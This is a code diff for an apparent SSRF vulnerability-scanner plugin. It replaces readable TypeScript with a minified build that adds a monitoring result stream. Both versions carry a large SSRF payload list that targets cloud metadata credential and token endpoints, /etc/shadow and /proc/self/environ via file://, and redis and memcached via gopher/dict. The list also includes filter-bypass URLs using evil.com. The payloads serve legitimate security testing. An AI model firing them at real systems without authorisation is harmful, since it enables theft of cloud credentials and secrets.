@@ -3,7 +3,7 @@
  *
  * @plugin ssrf_detector
  * @name SSRF Detector
- * @version 1.3.5
+ * @version 1.3.6
  * @author Sentinel Team
  * @main_category agent
  * @monitor_type risk
@@ -11,626 +11,164 @@
  * @target_asset_types ["web"]
  * @category vuln
  * @default_severity high
- * @tags ssrf, vulnerability, security, web
+ * @tags ssrf, vulnerability, security, web, capability:fetch, capability:monitor-events, monitor:results-stream-v2
  * @description Detect Server-Side Request Forgery (SSRF) vulnerabilities by testing URL parameters with various payloads
+ * @target_sources ["surface_asset","bounty_asset","scope"]
+ * @seed_bindings []
  */
-
-interface ToolInput {
-    url: string;
-    method?: string;
-    params?: Record<string, string>;
-    headers?: Record<string, string>;
-    body?: string;
-    userAgent?: string;
-    callbackUrl?: string;
-    testInternal?: boolean;
-    testCloud?: boolean;
-    testProtocols?: boolean;
-}
-
-interface SsrfTest {
-    parameter: string;
-    payload: string;
-    payloadType: string;
-    vulnerable: boolean;
-    evidence?: string;
-    responseCode?: number;
-    responseTime?: number;
-    error?: string;
-}
-
-interface ToolOutput {
-    success: boolean;
-    data?: {
-        url: string;
-        method: string;
-        tests: SsrfTest[];
-        summary: {
-            totalTests: number;
-            vulnerableCount: number;
-            testedParameters: string[];
-            vulnerableParameters: string[];
-        };
-    };
-    error?: string;
-}
-
-type PluginGlobals = typeof globalThis & {
-    get_input_schema?: typeof get_input_schema;
-    get_output_schema?: typeof get_output_schema;
-    analyze?: typeof analyze;
-};
-
-const pluginGlobals = globalThis as PluginGlobals;
-
-// SSRF payloads organized by type
-const SSRF_PAYLOADS: Record<string, { payload: string; description: string }[]> = {
-    localhost: [
-        { payload: "http://localhost", description: "Basic localhost" },
-        { payload: "http://localhost:80", description: "Localhost port 80" },
-        { payload: "http://localhost:443", description: "Localhost port 443" },
-        { payload: "http://localhost:22", description: "Localhost SSH port" },
-        { payload: "http://localhost:3306", description: "Localhost MySQL port" },
-        { payload: "http://127.0.0.1", description: "IPv4 loopback" },
-        { payload: "http://127.0.0.1:80", description: "IPv4 loopback port 80" },
-        { payload: "http://127.1", description: "Short IPv4 loopback" },
-        { payload: "http://0.0.0.0", description: "All interfaces" },
-        { payload: "http://0", description: "Zero address" },
-        { payload: "http://[::1]", description: "IPv6 loopback" },
-        { payload: "http://[0:0:0:0:0:0:0:1]", description: "Full IPv6 loopback" },
-        { payload: "http://0177.0.0.1", description: "Octal localhost" },
-        { payload: "http://0x7f.0.0.1", description: "Hex localhost" },
-        { payload: "http://2130706433", description: "Decimal localhost" },
-        { payload: "http://017700000001", description: "Octal full localhost" },
-        { payload: "http://0x7f000001", description: "Hex full localhost" },
-    ],
-    
-    internal: [
-        { payload: "http://192.168.0.1", description: "Common router IP" },
-        { payload: "http://192.168.1.1", description: "Common router IP" },
-        { payload: "http://10.0.0.1", description: "Private network" },
-        { payload: "http://172.16.0.1", description: "Private network" },
-        { payload: "http://169.254.169.254", description: "Link-local metadata" },
-        { payload: "http://internal", description: "Internal hostname" },
-        { payload: "http://intranet", description: "Intranet hostname" },
-        { payload: "http://corp", description: "Corp hostname" },
-    ],
-    
-    cloud_aws: [
-        { payload: "http://169.254.169.254/latest/meta-data/", description: "AWS metadata endpoint" },
-        { payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", description: "AWS IAM credentials" },
-        { payload: "http://169.254.169.254/latest/user-data/", description: "AWS user data" },
-        { payload: "http://169.254.169.254/latest/meta-data/hostname", description: "AWS hostname" },
-        { payload: "http://169.254.169.254/latest/meta-data/local-ipv4", description: "AWS local IP" },
-        { payload: "http://169.254.169.254/latest/dynamic/instance-identity/document", description: "AWS instance identity" },
-        { payload: "http://[fd00:ec2::254]/latest/meta-data/", description: "AWS IPv6 metadata" },
-    ],
-    
-    cloud_gcp: [
-        { payload: "http://metadata.google.internal/computeMetadata/v1/", description: "GCP metadata" },
-        { payload: "http://169.254.169.254/computeMetadata/v1/", description: "GCP metadata alt" },
-        { payload: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", description: "GCP token" },
-        { payload: "http://metadata.google.internal/computeMetadata/v1/project/project-id", description: "GCP project ID" },
-    ],
-    
-    cloud_azure: [
-        { payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", description: "Azure metadata" },
-        { payload: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", description: "Azure token" },
-    ],
-    
-    cloud_digitalocean: [
-        { payload: "http://169.254.169.254/metadata/v1/", description: "DigitalOcean metadata" },
-        { payload: "http://169.254.169.254/metadata/v1/id", description: "DigitalOcean droplet ID" },
-        { payload: "http://169.254.169.254/metadata/v1/hostname", description: "DigitalOcean hostname" },
-    ],
-    
-    protocols: [
-        { payload: "file:///etc/passwd", description: "File protocol - passwd" },
-        { payload: "file:///etc/hosts", description: "File protocol - hosts" },
-        { payload: "file:///etc/shadow", description: "File protocol - shadow" },
-        { payload: "file:///proc/self/environ", description: "File protocol - environ" },
-        { payload: "file:///proc/self/cmdline", description: "File protocol - cmdline" },
-        { payload: "file://localhost/etc/passwd", description: "File with localhost" },
-        { payload: "file:///c:/windows/win.ini", description: "Windows file" },
-        { payload: "dict://localhost:11211/stat", description: "Dict protocol - memcached" },
-        { payload: "gopher://localhost:6379/_INFO", description: "Gopher protocol - redis" },
-        { payload: "ftp://localhost", description: "FTP protocol" },
-        { payload: "sftp://localhost", description: "SFTP protocol" },
-        { payload: "tftp://localhost/file", description: "TFTP protocol" },
-        { payload: "ldap://localhost", description: "LDAP protocol" },
-    ],
-    
-    bypass: [
-        { payload: "http://localhost%00.evil.com", description: "Null byte bypass" },
-        { payload: "http://localhost%2500.evil.com", description: "Double URL encode bypass" },
-        { payload: "http://evil.com@localhost", description: "Basic auth bypass" },
-        { payload: "http://localhost#@evil.com", description: "Fragment bypass" },
-        { payload: "http://localhost?.evil.com", description: "Query bypass" },
-        { payload: "http://localhost\\@evil.com", description: "Backslash bypass" },
-        { payload: "http://localhost%23@evil.com", description: "Encoded hash bypass" },
-        { payload: "http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ", description: "Unicode bypass" },
-        { payload: "http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ", description: "Unicode domain" },
-        { payload: "http://localhost。evil.com", description: "Fullwidth dot bypass" },
-        { payload: "http://127。0。0。1", description: "Fullwidth dots IP" },
-        { payload: "http://localtest.me", description: "DNS rebinding domain" },
-        { payload: "http://spoofed.burpcollaborator.net", description: "Collaborator domain" },
-    ],
-    
-    redirect: [
-        { payload: "http://httpbin.org/redirect-to?url=http://localhost", description: "Open redirect to localhost" },
-        { payload: "http://httpbin.org/redirect-to?url=http://169.254.169.254/", description: "Open redirect to metadata" },
-    ],
-};
-
-// Indicators of successful SSRF
-const SSRF_INDICATORS = [
-    // AWS metadata
-    /ami-id/i,
-    /instance-id/i,
-    /security-credentials/i,
-    /iam\/info/i,
-    
-    // GCP metadata
-    /computeMetadata/i,
-    /service-accounts/i,
-    
-    // Azure metadata
-    /vmId/i,
-    /subscriptionId/i,
-    
-    // File contents
-    /root:.*:0:0/,  // /etc/passwd
-    /localhost/i,    // /etc/hosts
-    /\[extensions\]/i, // win.ini
-    
-    // Internal services
-    /redis_version/i,
-    /memcached/i,
-    /STAT items/i,
-    
-    // Error messages indicating SSRF
-    /Connection refused/i,
-    /Connection timed out/i,
-    /No route to host/i,
-    /Network is unreachable/i,
-];
-
-const DEFAULT_CONCURRENCY = 32;
-const MAX_CONCURRENCY = 32;
-
-async function runWithConcurrency<T>(tasks: Array<() => Promise<T>>, concurrency: number): Promise<T[]> {
-    if (tasks.length === 0) {
-        return [];
-    }
-
-    const limit = Math.max(1, Math.min(concurrency, tasks.length));
-    const results = new Array<T>(tasks.length);
-    let nextIndex = 0;
-
-    const workers = Array.from({ length: limit }, async () => {
-        while (true) {
-            const index = nextIndex++;
-            if (index >= tasks.length) {
-                return;
-            }
-            results[index] = await tasks[index]();
-        }
-    });
-
-    await Promise.all(workers);
-    return results;
-}
-
-/**
- * Export input schema
- */
-export function get_input_schema() {
-    return {
-        type: "object",
-        required: ["url"],
-        properties: {
-            url: {
-                type: "string",
-                description: "Target URL with potential SSRF parameters"
-            },
-            method: {
-                type: "string",
-                enum: ["GET", "POST", "PUT", "PATCH"],
-                description: "HTTP method",
-                default: "GET"
-            },
-            params: {
-                type: "object",
-                description: "URL parameters to test (key-value pairs)",
-                additionalProperties: { type: "string" }
-            },
-            headers: {
-                type: "object",
-                description: "Custom headers to include",
-                additionalProperties: { type: "string" }
-            },
-            body: {
-                type: "string",
-                description: "Request body for POST/PUT requests"
-            },
-            userAgent: {
-                type: "string",
-                description: "Custom User-Agent header"
-            },
-            callbackUrl: {
-                type: "string",
-                description: "Callback URL for out-of-band detection (e.g., Burp Collaborator)"
-            },
-            testInternal: {
-                type: "boolean",
-                description: "Test internal network payloads",
-                default: true
-            },
-            testCloud: {
-                type: "boolean",
-                description: "Test cloud metadata payloads",
-                default: true
-            },
-            testProtocols: {
-                type: "boolean",
-                description: "Test alternative protocols (file://, gopher://, etc.)",
-                default: true
-            }
-        }
-    };
-}
-
-pluginGlobals.get_input_schema = get_input_schema;
-
-/**
- * Export output schema
- */
-export function get_output_schema() {
-    return {
-        type: "object",
-        properties: {
-            success: { type: "boolean", description: "Whether the operation succeeded" },
-            data: {
-                type: "object",
-                properties: {
-                    url: { type: "string", description: "Target URL" },
-                    method: { type: "string" },
-                    tests: {
-                        type: "array",
-                        items: {
-                            type: "object",
-                            properties: {
-                                parameter: { type: "string" },
-                                payload: { type: "string" },
-                                payloadType: { type: "string" },
-                                vulnerable: { type: "boolean" },
-                                evidence: { type: "string" }
-                            }
-                        },
-                        description: "SSRF test results"
-                    },
-                    summary: {
-                        type: "object",
-                        properties: {
-                            totalTests: { type: "integer" },
-                            vulnerableCount: { type: "integer" },
-                            vulnerableParameters: { type: "array", items: { type: "string" } }
-                        }
-                    }
-                }
-            },
-            error: { type: "string", description: "Error message if failed" }
-        }
-    };
-}
-
-pluginGlobals.get_output_schema = get_output_schema;
-
-/**
- * Parse URL and extract parameters
- */
-function parseUrl(url: string): { baseUrl: string; params: Record<string, string> } {
-    try {
-        const urlObj = new URL(url);
-        const params: Record<string, string> = {};
-        urlObj.searchParams.forEach((value, key) => {
-            params[key] = value;
-        });
-        return {
-            baseUrl: `${urlObj.origin}${urlObj.pathname}`,
-            params,
-        };
-    } catch {
-        return { baseUrl: url, params: {} };
-    }
-}
-
-/**
- * Build URL with parameters
- */
-function buildUrl(baseUrl: string, params: Record<string, string>): string {
-    const url = new URL(baseUrl);
-    for (const [key, value] of Object.entries(params)) {
-        url.searchParams.set(key, value);
-    }
-    return url.toString();
-}
-
-/**
- * Check if response indicates SSRF
- */
-function checkSsrfIndicators(responseText: string): string | null {
-    for (const indicator of SSRF_INDICATORS) {
-        if (indicator.test(responseText)) {
-            const match = responseText.match(indicator);
-            return match ? match[0] : "Pattern matched";
-        }
-    }
-    return null;
-}
-
-/**
- * Identify URL-like parameters
- */
-function identifyUrlParams(params: Record<string, string>): string[] {
-    const urlParams: string[] = [];
-    const urlParamNames = [
-        "url", "uri", "link", "href", "src", "source", "dest", "destination",
-        "redirect", "redirect_uri", "redirect_url", "return", "return_url",
-        "next", "next_url", "target", "path", "file", "page", "load",
-        "fetch", "request", "proxy", "forward", "callback", "continue",
-        "image", "img", "picture", "photo", "avatar", "icon", "logo",
-        "feed", "rss", "xml", "data", "content", "resource", "ref",
-        "site", "host", "domain", "endpoint", "api", "service",
-    ];
-    
-    for (const [key, value] of Object.entries(params)) {
-        const lowerKey = key.toLowerCase();
-        
-        // Check if parameter name suggests URL
-        if (urlParamNames.some(name => lowerKey.includes(name))) {
-            urlParams.push(key);
-            continue;
-        }
-        
-        // Check if value looks like URL
-        if (value.startsWith("http://") || value.startsWith("https://") || value.startsWith("//")) {
-            urlParams.push(key);
-        }
-    }
-    
-    return [...new Set(urlParams)];
-}
-
-function dedupeTypedPayloads(payloads: { payload: string; type: string }[]): { payload: string; type: string }[] {
-    const seen = new Set<string>();
-    const deduped: { payload: string; type: string }[] = [];
-
-    for (const payloadEntry of payloads) {
-        const payload = String(payloadEntry.payload || "").trim();
-        if (!payload || seen.has(payload)) continue;
-        seen.add(payload);
-        deduped.push({ payload, type: payloadEntry.type });
-    }
-
-    return deduped;
-}
-
-function hasStrongSsrfEvidence(test: SsrfTest): boolean {
-    if (!test.vulnerable || typeof test.evidence !== "string") return false;
-    return !test.evidence.toLowerCase().startsWith("slow response");
-}
-
-/**
- * Test a single SSRF payload
- */
-async function testPayload(
-    baseUrl: string,
-    params: Record<string, string>,
-    targetParam: string,
-    payload: string,
-    payloadType: string,
-    options: {
-        method: string;
-        headers: Record<string, string>;
-    }
-): Promise<SsrfTest> {
-    const testParams = { ...params, [targetParam]: payload };
-    const testUrl = buildUrl(baseUrl, testParams);
-    const startTime = performance.now();
-    
-    try {
-        const response = await fetch(testUrl, {
-            method: options.method,
-            headers: options.headers,
-            redirect: "follow",
-            timeout: 10000,
-        });
-        
-        const responseTime = Math.round(performance.now() - startTime);
-        const responseText = await response.text();
-        
-        // Check for SSRF indicators
-        const evidence = checkSsrfIndicators(responseText);
-        
-        // Check for timing-based detection (slow response might indicate internal network access)
-        const timingAnomaly = responseTime > 5000;
-        
-        // Check for different response compared to baseline
-        const vulnerable = evidence !== null || timingAnomaly;
-        
-        return {
-            parameter: targetParam,
-            payload,
-            payloadType,
-            vulnerable,
-            evidence: evidence || (timingAnomaly ? "Slow response (possible internal network access)" : undefined),
-            responseCode: response.status,
-            responseTime,
-        };
-        
-    } catch (error: any) {
-        const responseTime = Math.round(performance.now() - startTime);
-        
-        // Some errors might indicate SSRF (e.g., connection refused to internal service)
-        const errorMessage = error.message || String(error);
-        const errorIndicatesAccess = /refused|timeout|unreachable/i.test(errorMessage);
-        
-        return {
-            parameter: targetParam,
-            payload,
-            payloadType,
-            vulnerable: errorIndicatesAccess,
-            evidence: errorIndicatesAccess ? `Error indicates internal access: ${errorMessage}` : undefined,
-            responseTime,
-            error: errorMessage,
-        };
-    }
-}
-
-/**
- * Main analysis function
- */
-export async function analyze(input: ToolInput): Promise<ToolOutput> {
-    try {
-        // Validate input
-        if (!input.url || typeof input.url !== "string") {
-            return {
-                success: false,
-                error: "Invalid input: url parameter is required"
-            };
-        }
-        
-        const { baseUrl, params: urlParams } = parseUrl(input.url);
-        const params = { ...urlParams, ...(input.params || {}) };
-        
-        const method = input.method || "GET";
-        const userAgent = input.userAgent || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
-                const testInternal = input.testInternal !== false;
-        const testCloud = input.testCloud !== false;
-        const testProtocols = input.testProtocols !== false;
-        
-        const headers: Record<string, string> = {
-            "User-Agent": userAgent,
-            "Accept": "*/*",
-            ...(input.headers || {}),
-        };
-        
-        // Identify URL-like parameters to test
-        const urlParamsToTest = identifyUrlParams(params);
-        
-        if (urlParamsToTest.length === 0) {
-            return {
-                success: true,
-                data: {
-                    url: input.url,
-                    method,
-                    tests: [],
-                    summary: {
-                        totalTests: 0,
-                        vulnerableCount: 0,
-                        testedParameters: [],
-                        vulnerableParameters: [],
-                    },
-                },
-            };
-        }
-        
-        // Build payload list based on options
-        const payloadsToTest: { payload: string; type: string }[] = [];
-        
-        // Always test localhost
-        for (const p of SSRF_PAYLOADS.localhost) {
-            payloadsToTest.push({ payload: p.payload, type: "localhost" });
-        }
-        
-        if (testInternal) {
-            for (const p of SSRF_PAYLOADS.internal) {
-                payloadsToTest.push({ payload: p.payload, type: "internal" });
-            }
-        }
-        
-        if (testCloud) {
-            for (const p of SSRF_PAYLOADS.cloud_aws) {
-                payloadsToTest.push({ payload: p.payload, type: "cloud_aws" });
-            }
-            for (const p of SSRF_PAYLOADS.cloud_gcp) {
-                payloadsToTest.push({ payload: p.payload, type: "cloud_gcp" });
-            }
-            for (const p of SSRF_PAYLOADS.cloud_azure) {
-                payloadsToTest.push({ payload: p.payload, type: "cloud_azure" });
-            }
-        }
-        
-        if (testProtocols) {
-            for (const p of SSRF_PAYLOADS.protocols) {
-                payloadsToTest.push({ payload: p.payload, type: "protocols" });
-            }
-        }
-        
-        // Add bypass payloads
-        for (const p of SSRF_PAYLOADS.bypass.slice(0, 5)) {
-            payloadsToTest.push({ payload: p.payload, type: "bypass" });
-        }
-        
-        // Add callback URL if provided
-        if (input.callbackUrl) {
-            payloadsToTest.push({ payload: input.callbackUrl, type: "callback" });
-        }
-        
-        const dedupedPayloads = dedupeTypedPayloads(payloadsToTest);
-        const compromisedParams = new Set<string>();
-        const payloadTasks: Array<() => Promise<SsrfTest | null>> = [];
-        for (const param of urlParamsToTest) {
-            for (const { payload, type } of dedupedPayloads) {
-                payloadTasks.push(async () => {
-                    if (compromisedParams.has(param)) return null;
-
-                    const result = await testPayload(
-                        baseUrl,
-                        params,
-                        param,
-                        payload,
-                        type,
-                        { method, headers }
-                    );
-
-                    if (hasStrongSsrfEvidence(result)) {
-                        compromisedParams.add(param);
-                    }
-
-                    return result;
-                });
-            }
-        }
-        const tests = (await runWithConcurrency(payloadTasks, DEFAULT_CONCURRENCY))
-            .filter((test): test is SsrfTest => Boolean(test));
-        
-        // Build summary
-        const vulnerableTests = tests.filter(t => t.vulnerable);
-        const vulnerableParameters = [...new Set(vulnerableTests.map(t => t.parameter))];
-        
-        return {
-            success: true,
-            data: {
-                url: input.url,
-                method,
-                tests,
-                summary: {
-                    totalTests: tests.length,
-                    vulnerableCount: vulnerableTests.length,
-                    testedParameters: urlParamsToTest,
-                    vulnerableParameters,
-                },
-            },
-        };
-        
-    } catch (error: any) {
-        return {
-            success: false,
-            error: error instanceof Error ? error.message : String(error),
-        };
-    }
-}
-
-pluginGlobals.analyze = analyze;
+// Generated by scripts/build_monitor_plugins.mjs from source/agent/ssrf_detector/index.ts; edit the source modules.
+var MONITOR_DELTA_INPUT_FIELDS=["targets","target_objects","service_targets","__monitorExecution","previousSnapshots","previous_snapshots","dictionaryEntries","\
+dictionary"];function isJsonObject(value){return value!==null&&typeof value==="object"&&!Array.isArray(value)}function serializedBytes(text){let bytes=0;for(let index=0;index<
+text.length;index++){const code=text.charCodeAt(index);if(code<128)bytes++;else if(code<2048)bytes+=2;else if(code>=55296&&code<=56319){bytes+=4;index++}else bytes+=
+3}return bytes}function jsonBytes(value){return serializedBytes(JSON.stringify(value))}function objectNode(members){let bytes=2+Math.max(0,members.size-1);const entries=[];
+for(const[key,entry]of members){bytes+=entry.keyBytes+1+entry.node.bytes;entries.push([key,entry.node.value])}return{kind:"object",value:Object.fromEntries(entries),
+bytes,members}}function node(value){if(Array.isArray(value)){let bytes=2+Math.max(0,value.length-1);for(const item of value)bytes+=node(item).bytes;return{kind:"\
+array",value,bytes}}if(isJsonObject(value)){return objectNode(new Map(Object.entries(value).map(([key,value2])=>[key,{keyBytes:jsonBytes(key),node:node(value2)}])))}
+return{kind:"scalar",value,bytes:jsonBytes(value)}}function validateDeltaData(data){if(!isJsonObject(data)){throw new Error("Monitor result delta must contain s\
+uccess:true and an object data")}for(const key of MONITOR_DELTA_INPUT_FIELDS){if(Object.prototype.hasOwnProperty.call(data,key)){throw new Error(`Monitor result\
+ delta must not repeat execution input field data.${key}`)}}if(data.snapshots!==void 0&&!isJsonObject(data.snapshots)){throw new Error("Monitor snapshot delta m\
+ust be an object")}}function copyMonitorDelta(output){if(!isJsonObject(output)||output.success!==true){throw new Error("Monitor result delta must contain succes\
+s:true and an object data")}validateDeltaData(output.data);const data=JSON.parse(JSON.stringify(output.data));validateDeltaData(data);return node(data)}var EMPTY_REQUEST_BYTES=jsonBytes({sequence:0,work:[]});function monitorRequestBytes(sequence,workContentsBytes){return EMPTY_REQUEST_BYTES-1+jsonBytes(sequence)+
+workContentsBytes}var MAX_WORK_ITEMS=32;var MAX_JSON_BYTES=2*1024*1024;var COMMIT_INTERVAL_MS=5e3;function positiveLimit(value,maximum,label){if(!Number.isInteger(value)||Number(
+value)<1||Number(value)>maximum){throw new Error(`Monitor result stream ${label} must be an integer between 1 and ${maximum}`)}return Number(value)}function createMonitorResultStream(input){
+const context=isJsonObject(input)?input.__monitorExecution:void 0;if(context===void 0){return{enabled:false,assertHealthy(){},async record(_target,_key,_output,_options){},
+async finish(finalOutput){return finalOutput}}}if(!isJsonObject(context)||!isJsonObject(context.result_stream)||context.result_stream.protocol!=="monitor-result\
+s-v2"){throw new Error("Monitor execution requires the monitor-results-v2 result stream")}const monitor=globalThis.Sentinel?.Monitor;if(typeof monitor?.commitResults!==
+"function"){throw new Error("Monitor execution requires Sentinel.Monitor.commitResults")}const stream=context.result_stream;if(!Array.isArray(stream.targets)||stream.
+targets.some(target=>typeof target!=="string"||!target)){throw new Error("Monitor result stream requires the host-owned targets array")}const expected=new Set(stream.
+targets);const chunkSize=positiveLimit(stream.max_work_items,MAX_WORK_ITEMS,"max_work_items");const maxPending=positiveLimit(stream.max_pending_commits,2,"max_p\
+ending_commits");const byteLimit=positiveLimit(stream.max_bytes,MAX_JSON_BYTES,"max_bytes");const completed=new Set;const pending=new Set;const bufferedKeys=new Set;
+let buffered=[];let workContentsBytes=0;let sequence=0;let lastCommitAt=Date.now();let failed;let finished=false;let serialization=Promise.resolve();let committedItems=0;
+let submittedBatches=0;let maxPendingObserved=0;let backpressureMs=0;let submittedJsonBytes=0;let committedJsonBytes=0;let maxBatchJsonBytes=0;function assertHealthy(){
+if(failed)throw failed;if(finished)throw new Error("Monitor result stream is already finished")}function latch(error){failed||(failed=error instanceof Error?error:
+new Error(String(error)));return failed}async function capacity(){const start=Date.now();while(pending.size>=maxPending){await Promise.race(pending);if(failed)throw failed}
+backpressureMs+=Date.now()-start;if(failed)throw failed}async function flush(){assertHealthy();if(!buffered.length)return;await capacity();const request={sequence:sequence+
+1,work:buffered};const encodedBytes=monitorRequestBytes(request.sequence,workContentsBytes);if(encodedBytes>byteLimit)throw new Error("Monitor result batch exce\
+eds the JSON byte limit");sequence++;const keys=buffered.map(item=>JSON.stringify([item.target,item.key]));buffered=[];workContentsBytes=0;lastCommitAt=Date.now();
+submittedBatches++;submittedJsonBytes+=encodedBytes;maxBatchJsonBytes=Math.max(maxBatchJsonBytes,encodedBytes);let commit;commit=Promise.resolve().then(async()=>{
+const ack=await monitor.commitResults(request);if(ack?.ok!==true||ack.sequence!==request.sequence){throw new Error(`Monitor result commit ${request.sequence} wa\
+s not acknowledged`)}committedItems+=request.work.length;committedJsonBytes+=encodedBytes}).catch(error=>{latch(error)}).finally(()=>{for(const key of keys)bufferedKeys.
+delete(key);pending.delete(commit)});pending.add(commit);maxPendingObserved=Math.max(maxPendingObserved,pending.size);await capacity()}function exclusive(action){
+const operation=serialization.then(action).catch(error=>{throw latch(error)});serialization=operation.then(()=>{},()=>{});return operation}async function record(target,key,output,options={}){
+return exclusive(async()=>{assertHealthy();if(typeof target!=="string"||!expected.has(target))throw new Error("Monitor work target is not owned by this executio\
+n");if(typeof key!=="string"||!key||key.length>2048)throw new Error("Monitor work key must contain 1 to 2048 characters");if(completed.has(target))throw new Error(
+"Monitor work cannot follow a completed target");const identity=JSON.stringify([target,key]);if(bufferedKeys.has(identity))throw new Error("Monitor work repeats\
+ an unacknowledged target/key");const status=options.status??"ok";if(!["ok","failed","skipped"].includes(status))throw new Error("Invalid monitor work status");
+const delta=copyMonitorDelta(output);if(status!=="ok"&&isJsonObject(delta.value.snapshots)&&Object.keys(delta.value.snapshots).length){throw new Error("Only suc\
+cessful work may update snapshots")}if(isJsonObject(delta.value.snapshots)&&Object.keys(delta.value.snapshots).length&&options.snapshot_complete!==true){throw new Error(
+"Snapshot updates require an explicitly complete observation")}const item={target,key,status,complete:options.complete!==false,output:{success:true,data:delta.value}};
+if(options.error!==void 0)item.error=options.error;if(options.failure_category!==void 0)item.failure_category=options.failure_category;if(options.snapshot_complete!==
+void 0)item.snapshot_complete=options.snapshot_complete;const itemBytes=jsonBytes(item);if(monitorRequestBytes(sequence+1,itemBytes)>byteLimit){throw new Error(
+"A single monitor work result exceeds the JSON byte limit")}let combinedWorkBytes=workContentsBytes+(buffered.length?1:0)+itemBytes;if(buffered.length&&monitorRequestBytes(
+sequence+1,combinedWorkBytes)>byteLimit){await flush();combinedWorkBytes=itemBytes}buffered.push(item);workContentsBytes=combinedWorkBytes;bufferedKeys.add(identity);
+if(item.complete)completed.add(target);if(buffered.length>=chunkSize||Date.now()-lastCommitAt>=COMMIT_INTERVAL_MS)await flush()})}async function finish(finalOutput){
+return exclusive(async()=>{assertHealthy();await flush();await Promise.all(pending);if(failed)throw failed;const finalRecord=isJsonObject(finalOutput)?finalOutput:
+void 0;if(finalRecord?.success===false){throw new Error(typeof finalRecord.error==="string"&&finalRecord.error?finalRecord.error:"Monitor plugin reported an uns\
+uccessful execution")}if(completed.size!==expected.size){throw new Error(`Monitor result stream ended before all targets completed (${completed.size}/${expected.
+size})`)}const finalDiagnostics=finalRecord&&isJsonObject(finalRecord.data)&&isJsonObject(finalRecord.data.summary)&&isJsonObject(finalRecord.data.summary.diagnostics)?
+finalRecord.data.summary.diagnostics:{};const pluginMetrics=Object.fromEntries(Object.entries(finalDiagnostics).filter(([,value])=>typeof value==="number"&&Number.
+isFinite(value)&&value>=0));finished=true;return{success:true,data:{stream_complete:true,summary:{diagnostics:{...pluginMetrics,submitted_json_bytes:submittedJsonBytes,
+committed_json_bytes:committedJsonBytes,max_batch_json_bytes:maxBatchJsonBytes,committed_work_items:committedItems,completed_targets:completed.size,submitted_batches:submittedBatches,
+max_pending_commits:maxPendingObserved,backpressure_ms_sum:backpressureMs}}}}})}return{enabled:true,assertHealthy,record,finish}}var aliases=["targets","urls","url","domains","domain","ips","ip"];var activeScope;function observedFetch(input,init){const scope=activeScope;if(!scope)return globalThis.
+fetch(input,init);const key=`http:${++scope.sequence}`;const operation=(async()=>{scope.stream.assertHealthy();let response;try{response=await globalThis.fetch(
+input,init)}catch(error){await scope.stream.record(scope.target,key,{success:true,data:{results:[{kind:"http_observation",success:false}]}},{status:"failed",complete:false,
+error:String(error).slice(0,2048),failure_category:"network_other"});throw error}await scope.stream.record(scope.target,key,{success:true,data:{results:[{kind:"\
+http_observation",success:true,statusCode:response.status,method:String(init?.method||"GET")}]}},{complete:false});return response})();scope.pending.add(operation);
+void operation.finally(()=>scope.pending.delete(operation)).catch(()=>{});return operation}async function runMonitorTool(input,schema,business){const stream=createMonitorResultStream(
+input);if(activeScope)throw new Error("A monitored business scope is already active");if(!stream.enabled)return await business(input);try{const properties=schema?.
+properties||{};const supported=aliases.filter(key=>Object.prototype.hasOwnProperty.call(properties,key));if(!supported.length)throw new Error("Monitor business \
+schema must declare a standard target input");const targets=input.__monitorExecution.result_stream.targets;for(const target of targets){stream.assertHealthy();const ordinary={
+...input};delete ordinary.__monitorExecution;for(const key of aliases){if(!supported.includes(key))delete ordinary[key];else ordinary[key]=["url","domain","ip"].
+includes(key)?target:[target]}let result;const scope={target,stream,sequence:0,pending:new Set};activeScope=scope;try{result=await business(ordinary)}catch(error){
+result={success:false,error:error instanceof Error?error.message:String(error)}}finally{while(scope.pending.size)await Promise.allSettled([...scope.pending]);activeScope=
+void 0}stream.assertHealthy();if(!result||typeof result.success!=="boolean")throw new Error("Monitor business must return a ToolOutput");const success=result.success===
+true;const data={results:[{target,output:result}]};await stream.record(target,"complete",{success:true,data},{status:success?"ok":"failed",complete:true,snapshot_complete:success,
+...success?{}:{error:String(result.error||"Business observation failed")}})}return await stream.finish()}catch(error){const failure={success:false,error:error instanceof
+Error?error.message:String(error)};try{return await stream.finish(failure)}catch(saveError){return{success:false,error:saveError instanceof Error?saveError.message:
+String(saveError)}}}}function monitorToolOutputSchema(business){const terminalData={type:"object",required:["stream_complete","summary"],properties:{stream_complete:{
+const:true},summary:{type:"object"}}};const terminal={type:"object",required:["success","data"],properties:{success:{const:true},data:terminalData}};const failure={
+type:"object",required:["success","error"],properties:{success:{const:false},error:{type:"string",minLength:1}}};return{type:"object",required:["success"],properties:{
+success:{type:"boolean",description:"Execution outcome"},data:{type:"object",description:"Business output or acknowledged monitor completion",properties:{stream_complete:{
+type:"boolean"},summary:{type:"object"}}},error:{type:"string",description:"Execution failure"}},anyOf:[business,terminal,failure]}}var pluginGlobals=globalThis;var SSRF_PAYLOADS={localhost:[{payload:"http://localhost",description:"Basic localhost"},{payload:"http://localhost:80",description:"\
+Localhost port 80"},{payload:"http://localhost:443",description:"Localhost port 443"},{payload:"http://localhost:22",description:"Localhost SSH port"},{payload:"\
+http://localhost:3306",description:"Localhost MySQL port"},{payload:"http://127.0.0.1",description:"IPv4 loopback"},{payload:"http://127.0.0.1:80",description:"\
+IPv4 loopback port 80"},{payload:"http://127.1",description:"Short IPv4 loopback"},{payload:"http://0.0.0.0",description:"All interfaces"},{payload:"http://0",description:"\
+Zero address"},{payload:"http://[::1]",description:"IPv6 loopback"},{payload:"http://[0:0:0:0:0:0:0:1]",description:"Full IPv6 loopback"},{payload:"http://0177.\
+0.0.1",description:"Octal localhost"},{payload:"http://0x7f.0.0.1",description:"Hex localhost"},{payload:"http://2130706433",description:"Decimal localhost"},{payload:"\
+http://017700000001",description:"Octal full localhost"},{payload:"http://0x7f000001",description:"Hex full localhost"}],internal:[{payload:"http://192.168.0.1",
+description:"Common router IP"},{payload:"http://192.168.1.1",description:"Common router IP"},{payload:"http://10.0.0.1",description:"Private network"},{payload:"\
+http://172.16.0.1",description:"Private network"},{payload:"http://169.254.169.254",description:"Link-local metadata"},{payload:"http://internal",description:"I\
+nternal hostname"},{payload:"http://intranet",description:"Intranet hostname"},{payload:"http://corp",description:"Corp hostname"}],cloud_aws:[{payload:"http://\
